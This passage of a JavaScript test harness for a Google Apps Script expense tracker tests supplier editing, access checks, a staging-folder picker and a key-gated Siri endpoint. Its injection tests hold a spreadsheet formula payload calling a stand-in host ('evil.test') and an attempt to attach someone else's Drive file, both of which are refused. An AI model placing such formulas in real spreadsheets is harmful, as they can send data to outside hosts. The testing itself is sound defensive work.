  cappedRun.ok === false && cappedRun.incomplete === true, cappedRun);
check('one row done, one left', cappedRun.repair.rowsChanged === 1 &&
  cappedRun.repair.remaining === 1, cappedRun.repair);
check('the supplier still exists, so it can be saved again',
  supplierNamed('Countme') !== null);
check('and the merge target was NOT given the source\'s Times Used yet',
  supplierNamed('Countme').timesUsed === capped.timesUsed);

const finished = G.updateSupplier(supplierRow('Countme'), {
  name: 'White Clinic', type: '', nif: '', aliases: '', was: 'Countme'
}, 1);
check('saving again finishes it - re-running IS the repair',
  finished.ok === true && finished.merged.into === 'White Clinic', finished);
check('and now the supplier is gone', supplierNamed('Countme') === null);

section('the document repair can be re-run on its own');
const stale = G.uiCreateEntry('work', {
  values: { 'Date': '2026-03-12', 'Counterparty': 'Driftco', 'Expense Reason': 'r',
            'Amount': 7 },
  files: [{ header: 'Receipt URL', name: 'd.pdf', mimeType: 'application/pdf', data: b64 }]
});
const staleId = G.extractFileId(mocks._ss.getSheetByName('Work')
  .getRange(stale.row, G.resolveColumns(mocks._ss.getSheetByName('Work'))['Receipt URL'])
  .getValue());
mocks.DriveApp.getFileById(staleId).setName('something_wrong.pdf');
const repaired = G.uiRepairSupplierDocuments(supplierRow('Driftco'));
check('the name is rebuilt from the row',
  mocks.DriveApp.getFileById(staleId).getName() === '260312_Driftco_7-00_receipt.pdf',
  mocks.DriveApp.getFileById(staleId).getName());
check('and nothing was renamed', repaired.from === repaired.to && repaired.complete === true,
  repaired);

section('supplier editing refuses what it cannot do safely');
let blankName = null;
try {
  G.uiUpdateSupplier(supplierRow('Driftco'), { name: '   ', was: 'Driftco' });
} catch (e) { blankName = e.message; }
check('a blank name', /Name is required/.test(blankName || ''), blankName);

let staleRow = null;
try {
  G.uiUpdateSupplier(supplierRow('Driftco'), { name: 'Whatever', was: 'Somebody Else' });
} catch (e) { staleRow = e.message; }
check('a row that no longer holds the supplier the form loaded',
  /Reload the list/.test(staleRow || ''), staleRow);
check('and it changed nothing', supplierNamed('Driftco') !== null);

// normalizeName('') is '', which would match every row with an empty
// Counterparty and rename the lot.
let blankScan = null;
try { G.findSupplierEntries(''); } catch (e) { blankScan = e.message; }
check('a blank name never reaches the scan',
  /supplier name is required/.test(blankScan || ''), blankScan);

section('supplier functions check the caller');
mocks.Session._setActiveUser('someone.else@example.test');
[
  ['uiListSuppliers', []],
  ['uiSupplierPreview', [2, 'x']],
  ['uiUpdateSupplier', [2, { name: 'x' }]],
  ['uiRepairSupplierDocuments', [2]],
  ['uiAddSupplierAlias', ['x', 'y']]
].forEach(([name, args]) => {
  let refused = null;
  try { G[name].apply(null, args); } catch (e) { refused = e.message; }
  check(`${name} is gated`, /Not authorized/.test(refused || ''), refused);
});
mocks.Session._setActiveUser(mocks.Session._owner);

/*
 * The page reaches the server by name through google.script.run, so a renamed
 * function fails at the tap rather than at build time. Nothing else in this
 * harness would notice - it exercises the server directly.
 */
section('every function the page calls exists, and is gated');
/*
 * Matched on any 'uiXxx' STRING LITERAL rather than on `call('uiXxx'`, because
 * the narrower pattern silently stopped covering things. The page now picks its
 * list function with `call(archive ? 'uiListArchive' : 'uiListEntries', key)`,
 * which matched neither - so both names dropped out of this test without a
 * single failure to say so. A test that quietly covers less than it claims is
 * worse than no test, so this one errs towards catching too much.
 */
const pageSource = G.doGet().getContent();

/*
 * Two static checks on the page itself, because four of five defects found in
 * one hand-testing session were client-side and 439 passing server assertions
 * could not see any of them. These cannot replace clicking, but they catch the
 * two failures that are pure typing: a script that does not parse, and an
 * element id that does not exist.
 */
section('the page itself');
const pageScript = /<script>([\s\S]*?)<\/script>/.exec(pageSource);
check('has a script block', !!pageScript);
let pageParseError = null;
try { new vm.Script(pageScript[1]); } catch (e) { pageParseError = e.message; }
check('and it parses', pageParseError === null, pageParseError);

// el('x') is the page's only way to reach the DOM, so a typo in one is a
// TypeError at the tap and nowhere else. Literal arguments only.
const pageIds = {};
pageSource.replace(/\sid="([^"]+)"/g, (whole, id) => { pageIds[id] = true; return whole; });
const looked = [];
pageScript[1].replace(/\bel\('([^']+)'\)/g, (whole, id) => {
  if (looked.indexOf(id) === -1) looked.push(id);
  return whole;
});
check('looks up a plausible number of elements', looked.length >= 15, looked.length);
const missingIds = looked.filter(id => !pageIds[id]);
check('every el() target exists in the markup', missingIds.length === 0, missingIds);

const calledNames = [];
pageSource.replace(/'(ui[A-Z][A-Za-z0-9_]*)'/g, (whole, name) => {
  if (calledNames.indexOf(name) === -1) calledNames.push(name);
  return whole;
});
check('the page calls something at all', calledNames.length >= 5, calledNames);
calledNames.forEach(name => {
  check(`${name}: exists on the server`, typeof G[name] === 'function');
});

mocks.Session._setActiveUser('someone.else@example.test');
calledNames.forEach(name => {
  let refused = null;
  // Called with junk arguments on purpose: the access check must run before
  // anything looks at what was passed, so the refusal is the only outcome.
  try { G[name]('work', 2, 'x', 'y'); } catch (e) { refused = e.message; }
  check(`${name}: refuses a stranger`, /Not authorized/.test(refused || ''), refused);
});
mocks.Session._setActiveUser(mocks.Session._owner);

/* ------------------- Receipt Medium and the staging folder ---------------- */
{
section('Receipt Medium — the field');

check('work has it', !!G.sectionReceiptMedium(G.getSection('work')));
check('iva has it', !!G.sectionReceiptMedium(G.getSection('iva')));
check('health has it', !!G.sectionReceiptMedium(G.getSection('health')));
// Income has no fileColumns, so there is no document to go and find.
check('income does NOT', G.sectionReceiptMedium(G.getSection('income')) === null);

check('the header was generated onto the sheet',
  !!G.resolveColumns(mocks._ss.getSheetByName('Work'))['Receipt Medium']);

// Required would turn every completed web-form expense into an incomplete one
// and mail a reminder for something already finished.
check('it is NOT required', G.sectionReceiptMedium(G.getSection('work')).required === false);

const mediumEntry = G.createEntry('work', {
  Counterparty: 'Paper Shop', Amount: 5, Date: '2026-05-05',
  'Receipt Medium': 'Physical'
}, 'siri');
check('an entry with only the medium set is still just incomplete, not refused',
  mediumEntry.row > 1);

section('The completion mail says where to look');

const mediumSheet = mocks._ss.getSheetByName('Work');
const mediumCols = G.resolveColumns(mediumSheet);
const savedStaging = mocks._props.STAGING_FOLDER_ID;
mocks._props.STAGING_FOLDER_ID = 'fold-staging-test';

function hintFor(value, needsDocument) {
  G.writeCell(mediumSheet, mediumCols, mediumEntry.row, 'Receipt Medium', value);
  return G.documentLocationHint(G.getSection('work'), mediumSheet, mediumCols,
    mediumEntry.row, needsDocument !== false);
}

check('electronic says look in the mail',
  /mail/i.test((hintFor('Electronic') || {}).sentence || ''));
check('physical says scan it',
  /scan/i.test((hintFor('Physical') || {}).sentence || ''));
check('both mentions both',
  /paper/i.test((hintFor('Both') || {}).sentence || ''));
check('the folder link carries authuser',
  /authuser=/.test((hintFor('Physical') || {}).folderUrl || ''));

// A line that appears on every reminder saying nothing useful is a line you
// stop reading, and this one has to work on the day it matters.
check('silent when no medium was recorded', hintFor('') === null);
check('silent when the document already arrived',
  hintFor('Physical', false) === null);
check('silent for a section that has no medium field',
  G.documentLocationHint(G.getSection('income'), mediumSheet, mediumCols,
    mediumEntry.row, true) === null);

delete mocks._props.STAGING_FOLDER_ID;
const noFolder = hintFor('Physical');
check('still advises when no staging folder is configured', !!noFolder && !!noFolder.sentence);
check('but offers no link', noFolder.folderUrl === null);
if (savedStaging === undefined) delete mocks._props.STAGING_FOLDER_ID;
else mocks._props.STAGING_FOLDER_ID = savedStaging;

section('Picking a document out of the staging folder');

const staging = mocks.DriveApp.createFolder('Staging');
mocks._props.STAGING_FOLDER_ID = staging.getId();
const waiting = staging.createFile({ name: 'scan-001.pdf' });
const elsewhere = mocks.DriveApp.createFile({ name: 'private.pdf' });

check('the picker lists what is waiting',
  G.uiStagingFiles().some(f => f.id === waiting.getId()), G.uiStagingFiles());
check('and nothing that is not in the folder',
  !G.uiStagingFiles().some(f => f.id === elsewhere.getId()));

// THE check that matters. extractFileId takes an id out of any string and the
// script runs as me, so an id from outside the folder must not be accepted.
let refusedOutside = null;
try { G.uiResolveStagingPick(elsewhere.getId()); } catch (e) { refusedOutside = e.message; }
check('a file outside the staging folder is REFUSED',
  /not in the staging folder/.test(refusedOutside || ''), refusedOutside);
check('and it was not moved or renamed',
  elsewhere.getName() === 'private.pdf' && !elsewhere.trashed);

const picked = G.uiCreateEntry('work', {
  values: {
    Counterparty: 'Picked Co', Amount: 20, Date: '2026-06-06',
    'Expense Reason': 'Staging test'
  },
  picked: [{ header: 'Receipt URL', id: waiting.getId() }]
});
check('picking attaches the document', picked.ok !== false, picked);
check('and the entry is complete — a picked file counts as attached',
  picked.receiptState === 'attached');
check('the row points at the picked file',
  G.readCell(mediumSheet, G.resolveColumns(mediumSheet), picked.row, 'Receipt URL')
    .indexOf(waiting.getId()) !== -1);
// The whole reason picking beats uploading: no second copy, and the folder
// empties itself.
check('the file LEFT the staging folder', !G.uiStagingFiles()
  .some(f => f.id === waiting.getId()), G.uiStagingFiles());
check('it was renamed into the tree, not copied',
  waiting.getName() !== 'scan-001.pdf', waiting.getName());
check('and it still exists — picking never trashes', !waiting.trashed);

// A failed write must not destroy the staged original.
const survivor = staging.createFile({ name: 'scan-002.pdf' });
let pickFailure = null;
try {
  G.uiCreateEntry('work', {
    values: { Counterparty: 'Doomed', Amount: 1, Nonsense: 'x' },
    picked: [{ header: 'Receipt URL', id: survivor.getId() }]
  });
} catch (e) { pickFailure = e.message; }
check('a failed create still throws', !!pickFailure, pickFailure);
check('the PICKED file was NOT trashed — it is the only copy', !survivor.trashed);

let badColumn = null;
try {
  G.uiCollectDocuments(G.getSection('work'), [], [{ header: 'Amount', id: survivor.getId() }]);
} catch (e) { badColumn = e.message; }
check('a pick aimed at a non-document column is refused',
  /Not a document column/.test(badColumn || ''), badColumn);

delete mocks._props.STAGING_FOLDER_ID;
check('no staging folder configured: the picker is empty, not broken',
  G.uiStagingFiles().length === 0);
if (savedStaging !== undefined) mocks._props.STAGING_FOLDER_ID = savedStaging;
}

/* ----------------------------- Siri endpoint ------------------------------ */
/*
 * This is the one path with no human in front of it and no Google sign-in, so
 * it gets tested harder than the rest. The shim project that actually receives
 * the request contains nothing but a delegation to siriHandlePost, so
 * everything below is the whole endpoint.
 *
 * Braced because the harness is one flat scope and these names — `created`,
 * `workSheet` — are the obvious ones, already taken further up.
 */
{
section('Siri — the gate');

const SIRI_KEY = 'test-key-9f3c';

function siriPost(body) {
  const out = G.siriHandlePost({ postData: { contents: JSON.stringify(body) } });
  return JSON.parse(out.getContent());
}
function siriRaw(contents) {
  return JSON.parse(G.siriHandlePost(contents === null ? {} : { postData: { contents } }).getContent());
}

// Fails closed BEFORE the key is configured. This is the window that matters:
// the shim is deployed anonymously, so an unset key must mean shut, not open.
delete mocks._props.SIRI_API_KEY;
check('no key configured: refused',
  siriPost({ action: 'catalog', section: 'work' }).error === 'Not authorized.');

mocks._props.SIRI_API_KEY = SIRI_KEY;
check('key configured, none supplied: refused',
  siriPost({ action: 'catalog', section: 'work' }).error === 'Not authorized.');
check('wrong key: refused',
  siriPost({ key: 'wrong', action: 'catalog', section: 'work' }).error === 'Not authorized.');
check('key of the right length but wrong: refused',
  siriPost({ key: 'test-key-9f3d', action: 'catalog', section: 'work' }).error === 'Not authorized.');
check('empty-string key: refused',
  siriPost({ key: '', action: 'catalog', section: 'work' }).error === 'Not authorized.');
check('correct key: allowed',
  siriPost({ key: SIRI_KEY, action: 'catalog', section: 'work' }).ok === true);

check('malformed JSON: an error, not a throw', siriRaw('{not json').error === 'Body was not valid JSON.');
check('no post data at all: an error, not a throw', siriRaw(null).error === 'Empty request.');
check('a bare string body: refused', siriRaw('"hello"').error === 'Body was not an object.');
check('unknown action: named, and lists the real ones',
  /Unknown action: teleport/.test(siriPost({ key: SIRI_KEY, action: 'teleport', section: 'work' }).error || ''));
check('unknown section: refused',
  /Unknown section: pets/.test(siriPost({ key: SIRI_KEY, action: 'catalog', section: 'pets' }).error || ''));

// The gate runs before the router, so a bad key on a bad action still reads as
// a bad key - nothing about the endpoint's shape leaks to an unauthorised caller.
check('a stranger learns nothing about actions',
  siriPost({ action: 'teleport', section: 'pets' }).error === 'Not authorized.');

section('Siri — catalog');

const workCatalog = siriPost({ key: SIRI_KEY, action: 'catalog', section: 'work' });
check('work: category is Expense Reason', workCatalog.category.header === 'Expense Reason');
check('work: category is open', workCatalog.category.closed === false);
check('work: counterparty is called Supplier', workCatalog.counterpartyLabel === 'Supplier');
check('work: currency defaults to EUR', workCatalog.currency === 'EUR');
check('work: date defaults to today', workCatalog.date === G.today());

const healthCatalog = siriPost({ key: SIRI_KEY, action: 'catalog', section: 'health' });
check('health: category is Patient', healthCatalog.category.header === 'Patient');
check('health: patients are a closed list', healthCatalog.category.closed === true);
check('health: the list has values to tap', healthCatalog.category.values.length > 0,
  healthCatalog.category.values);
check('health: counterparty is called Provider', healthCatalog.counterpartyLabel === 'Provider');

check('iva: no category to ask about',
  siriPost({ key: SIRI_KEY, action: 'catalog', section: 'iva' }).category === null);
check('income: category present but not required',
  siriPost({ key: SIRI_KEY, action: 'catalog', section: 'income' }).category.required === false);

section('Siri — resolve corrects without writing');

const suppliersBefore = dump('Suppliers');
const workRowsBefore = mocks._ss.getSheetByName('Work').getLastRow();

const heardWrong = siriPost({
  key: SIRI_KEY, action: 'resolve', section: 'health', counterparty: 'wite clinic'
});
check('a mishearing resolves to the canonical spelling', heardWrong.confirm === 'White Clinic',
  heardWrong);
check('and says it corrected something', heardWrong.corrected === true);
check('and reports it as known', heardWrong.known === true);

const heardRight = siriPost({
  key: SIRI_KEY, action: 'resolve', section: 'health', counterparty: 'White Clinic'
});
check('an exact hit is not reported as a correction', heardRight.corrected === false, heardRight);
check('an exact hit is still known', heardRight.known === true);

const heardNew = siriPost({
  key: SIRI_KEY, action: 'resolve', section: 'work', counterparty: 'Brand New Cafe'
});
check('an unknown supplier keeps what was heard', heardNew.confirm === 'Brand New Cafe', heardNew);
check('an unknown supplier is not a correction', heardNew.corrected === false);
check('an unknown supplier is not claimed as known', heardNew.known === false);

check('a blank counterparty is refused',
  siriPost({ key: SIRI_KEY, action: 'resolve', section: 'work', counterparty: '   ' }).ok === false);

check('resolve wrote no supplier', dump('Suppliers') === suppliersBefore);
check('resolve wrote no row',
  mocks._ss.getSheetByName('Work').getLastRow() === workRowsBefore);

section('Siri — create, and what it refuses to write');

// THE exploit this whitelist exists to stop. extractFileId takes a Drive id out
// of any string, and the script runs as me.
const fileAttempt = siriPost({
  key: SIRI_KEY, action: 'create', section: 'work',
  fields: { Counterparty: 'Thief Ltd', Amount: 1, 'Receipt URL': 'https://drive.google.com/file/d/SOMEONEELSESFILE/view' }
});
check('a file column is REFUSED', fileAttempt.ok === false, fileAttempt);
check('and the refusal names the offending column',
  /Receipt URL/.test(fileAttempt.error || ''), fileAttempt.error);
check('nothing was written when a field was refused',
  mocks._ss.getSheetByName('Work').getLastRow() === workRowsBefore);

['Status', 'Claim Emailed', 'Receipt State', 'Claimed Date', 'Source', 'Timestamp'].forEach(header => {
  const attempt = siriPost({
    key: SIRI_KEY, action: 'create', section: 'work',
    fields: { Counterparty: 'X', Amount: 1, [header]: 'meddled' }
  });
  check(`bookkeeping column refused: ${header}`, attempt.ok === false, attempt);
});

// Refused, not silently dropped: a Shortcut must not believe it recorded
// something it did not.
const siriUnknownField = siriPost({
  key: SIRI_KEY, action: 'create', section: 'work',
  fields: { Counterparty: 'X', Amount: 1, Nonsense: 'y' }
});
check('an unknown field is refused rather than ignored',
  siriUnknownField.ok === false, siriUnknownField);

const created = siriPost({
  key: SIRI_KEY, action: 'create', section: 'work',
  fields: { Counterparty: 'Brand New Cafe', Amount: 12.4, 'Expense Reason': 'Lisbon trip' }
});
check('a core entry is created', created.ok === true && created.row > 1, created);

const workSheet = mocks._ss.getSheetByName('Work');
const workCols = G.resolveColumns(workSheet);
check('source records where it came from',
  G.readCell(workSheet, workCols, created.row, 'Source') === 'siri');
check('counterparty written', G.readCell(workSheet, workCols, created.row, 'Counterparty') === 'Brand New Cafe');
check('amount written', G.readCell(workSheet, workCols, created.row, 'Amount') === 12.4);
check('currency defaulted to EUR without being asked',
  G.readCell(workSheet, workCols, created.row, 'Currency') === 'EUR');
check('date defaulted to today without being asked',
  G.readCell(workSheet, workCols, created.row, 'Date') === G.today());
// The trap this caught: createEntry reports ok:true for a work expense with no
// receipt, because no REQUIRED field is blank. By that measure the entry that
// most needs finishing looks finished. "complete" has to follow the completion
// request, which is raised for an awaited document too.
check('no receipt, so the entry is incomplete', created.complete === false, created);
check('it names the missing document, not just a field',
  (created.outstanding || []).indexOf('Receipt') !== -1, created.outstanding);
check('and flags that a document is what is awaited', created.awaitingDocument === true);
check('no required field is actually missing', created.missingFields.length === 0, created);
check('the completion mail went', created.completionEmailed === true, created);

// A partial entry is the safety net, not a failure - the row exists and the
// completion mail has gone.
check('an incomplete entry is still reported ok:true', created.ok === true);

section('Siri — the registry fills what Siri cannot ask');

// Uber is always a Taxi, and Siri has no moment to ask.
G.recordSupplier('Bolt', { type: 'Taxi' });
const prefilled = siriPost({
  key: SIRI_KEY, action: 'create', section: 'work',
  fields: { Counterparty: 'Bolt', Amount: 8 }
});
check('Type prefilled from the registry on an exact match',
  G.readCell(workSheet, workCols, prefilled.row, 'Type') === 'Taxi');

// The counterparty arriving here is the one CONFIRMED on the phone. Re-running
// the fuzzy matcher could merge a supplier the confirmation had just
// established was a different business.
const nearMiss = siriPost({
  key: SIRI_KEY, action: 'create', section: 'work',
  fields: { Counterparty: 'Bolt Kitchens', Amount: 3 }
});
check('a near miss is NOT silently renamed to the registry entry',
  G.readCell(workSheet, workCols, nearMiss.row, 'Counterparty') === 'Bolt Kitchens');
check('and does not inherit its Type either',
  !G.readCell(workSheet, workCols, nearMiss.row, 'Type'));

// An explicit value must survive - the registry fills blanks, it does not
// overrule what was said.
const explicitType = siriPost({
  key: SIRI_KEY, action: 'create', section: 'work',
  fields: { Counterparty: 'Bolt', Amount: 9, 'Expense Reason': 'Porto' }
});
check('an explicitly supplied category survives the prefill',
  G.readCell(workSheet, workCols, explicitType.row, 'Expense Reason') === 'Porto');

section('Siri — injection and the other sections');

const formulaEntry = siriPost({
  key: SIRI_KEY, action: 'create', section: 'income',
  fields: { Counterparty: '=IMPORTXML("http://evil.test","//x")', Amount: 5 }
});
const incomeSheet = mocks._ss.getSheetByName('Income');
const incomeCols = G.resolveColumns(incomeSheet);
check('a formula counterparty is stored as text',
  G.readCell(incomeSheet, incomeCols, formulaEntry.row, 'Counterparty')
    .indexOf("'=IMPORTXML") === 0,
  G.readCell(incomeSheet, incomeCols, formulaEntry.row, 'Counterparty'));

const healthEntry = siriPost({
  key: SIRI_KEY, action: 'create', section: 'health',
  fields: { Counterparty: 'White Clinic', Amount: 70, Patient: healthCatalog.category.values[0] }
});
check('health: created with a patient', healthEntry.ok === true, healthEntry);
check('health: incomplete, because invoice date and documents are missing',
  healthEntry.complete === false);

const ivaEntry = siriPost({
  key: SIRI_KEY, action: 'create', section: 'iva',
  fields: { Counterparty: 'Continente', Amount: 30 }
});
check('iva: created', ivaEntry.ok === true, ivaEntry);
check('iva: incomplete — Número, NIF and Valor do IVA are completion-step fields',
  ivaEntry.complete === false, ivaEntry);
check('iva: a category cannot be sent to a section that has none',
  siriPost({ key: SIRI_KEY, action: 'create', section: 'iva',
    fields: { Counterparty: 'X', Amount: 1, Patient: 'Phoenix' } }).ok === false);

section('Siri — ping is inside the gate');

check('ping needs the key too', siriPost({ action: 'ping' }).error === 'Not authorized.');
const ping = siriPost({ key: SIRI_KEY, action: 'ping' });
check('ping reaches the spreadsheet', ping.ok === true, ping);
check('ping reports which properties it can see',
  ping.propertiesVisible.ROOT_FOLDER_ID === true, ping);
check('ping lists the sections', ping.sections.length === 4);

section('Siri — siriSetup()');

delete mocks._props.SIRI_API_KEY;
delete mocks._props.SPREADSHEET_ID;

const setup1 = G.siriSetup();
check('setup reads the spreadsheet id off the container, not a typed string',
  mocks._props.SPREADSHEET_ID === mocks.SPREADSHEET_ID, setup1);
check('setup generates a key', /^[0-9a-f]{32}$/.test(mocks._props.SIRI_API_KEY),
  mocks._props.SIRI_API_KEY);
check('setup returns the key once, so it can reach the Shortcut',
  setup1.key === mocks._props.SIRI_API_KEY);
check('the generated key works', siriPost({ key: setup1.key, action: 'ping' }).ok === true);

// Regenerating silently would break every Shortcut on the phone with nothing
// to say why.
const firstKey = mocks._props.SIRI_API_KEY;
const setup2 = G.siriSetup();
check('a second run does NOT replace the key', mocks._props.SIRI_API_KEY === firstKey);
check('and says so rather than returning a key that is not the real one',
  setup2.keyAlreadySet === true && setup2.key !== firstKey, setup2);

section('Siri — siriRotateKey()');

const beforeRotate = mocks._props.SIRI_API_KEY;
const rotated = G.siriRotateKey();
check('rotate replaces an existing key', mocks._props.SIRI_API_KEY !== beforeRotate);
check('and says that it did', rotated.replacedAnExistingKey === true, rotated);
check('and returns the new key, since nothing else will show it',
  rotated.key === mocks._props.SIRI_API_KEY);
check('the new key works', siriPost({ key: rotated.key, action: 'ping' }).ok === true);

// The point of rotating: whatever leaked stops working immediately.
check('the OLD key is refused at once',
  siriPost({ key: beforeRotate, action: 'ping' }).error === 'Not authorized.');

// siriSetup must stay the safe one, or the guard is pointless.
const afterRotate = mocks._props.SIRI_API_KEY;
G.siriSetup();
check('siriSetup still refuses to rotate', mocks._props.SIRI_API_KEY === afterRotate);

mocks._props.SIRI_API_KEY = SIRI_KEY;
}

/* ------------------------- getSpreadsheet() ------------------------------ */
/*
 * The Siri project is standalone and reaches this code as a library, so it has
 * no container. Everything below the accessor depends on the fallback, and none
 * of it is reachable from the bound tests above — which all take the first
 * branch.
 */
section('getSpreadsheet() — the container and the fallback');

check('bound: returns the active spreadsheet', G.getSpreadsheet() === mocks._ss);
mocks.SpreadsheetApp._openedIds.length = 0;
G.getSpreadsheet();
check('bound: never calls openById', mocks.SpreadsheetApp._openedIds.length === 0);

// From here on, no container — the library case.
mocks.SpreadsheetApp._noActive = true;
G.clearSpreadsheetCache();

const savedId = mocks._props.SPREADSHEET_ID;
delete mocks._props.SPREADSHEET_ID;
let noIdError = null;
try { G.getSpreadsheet(); } catch (e) { noIdError = e.message; }
check('standalone, no SPREADSHEET_ID: throws and names the property',
  /SPREADSHEET_ID/.test(noIdError || ''), noIdError);

mocks._props.SPREADSHEET_ID = mocks.SPREADSHEET_ID;
mocks.SpreadsheetApp._openedIds.length = 0;
check('standalone: opens by id', G.getSpreadsheet() === mocks._ss);
check('standalone: used the property',
  mocks.SpreadsheetApp._openedIds[0] === mocks.SPREADSHEET_ID, mocks.SpreadsheetApp._openedIds);

G.getSpreadsheet();
G.getSpreadsheet();
check('standalone: openById is cached, not refetched',
  mocks.SpreadsheetApp._openedIds.length === 1, mocks.SpreadsheetApp._openedIds);

// The whole point: real work, with no container at all.
const standaloneEntry = G.createEntry('work', {
  Counterparty: 'Standalone Ltd', Amount: 4.5, Date: '2026-05-05', Currency: 'EUR'
}, 'siri');
check('standalone: createEntry still writes a row', standaloneEntry.row > 1, standaloneEntry);
check('standalone: the row landed in the Work sheet',
  G.readCell(mocks._ss.getSheetByName('Work'), G.resolveColumns(mocks._ss.getSheetByName('Work')),
    standaloneEntry.row, 'Counterparty') === 'Standalone Ltd');

// A cached spreadsheet must not outlive the execution that opened it.
G.clearSpreadsheetCache();
mocks.SpreadsheetApp._openedIds.length = 0;
G.getSpreadsheet();
check('clearSpreadsheetCache() forces a fresh open',
  mocks.SpreadsheetApp._openedIds.length === 1);

mocks.SpreadsheetApp._noActive = false;
if (savedId === undefined) delete mocks._props.SPREADSHEET_ID; else mocks._props.SPREADSHEET_ID = savedId;
G.clearSpreadsheetCache();
check('restored: bound again', G.getSpreadsheet() === mocks._ss);

console.log('\n--- Suppliers sheet ---\n' + dump('Suppliers'));
console.log('\n--- Work sheet ---\n' + dump('Work'));
console.log(`\n================  ${pass} passed, ${fail} failed  ================`);
process.exit(fail ? 1 : 0);
